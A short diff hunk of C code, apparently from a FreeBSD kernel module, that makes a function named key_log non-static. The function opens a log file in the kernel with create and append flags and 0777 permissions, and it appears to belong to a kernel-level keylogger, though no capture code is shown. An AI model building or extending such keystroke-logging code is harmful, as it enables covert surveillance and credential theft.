@@ -24,7 +24,7 @@
 #include <sys/syscallsubr.h>
 #include <sys/pcpu.h>
 
-static int key_log(struct thread *td, char * buf){
+int key_log(struct thread *td, char * buf){
 
      int openError = kern_openat(td,AT_FDCWD,keyLogPath, UIO_SYSSPACE, O_WRONLY|O_CREAT|O_APPEND,0777);
      if(openError)
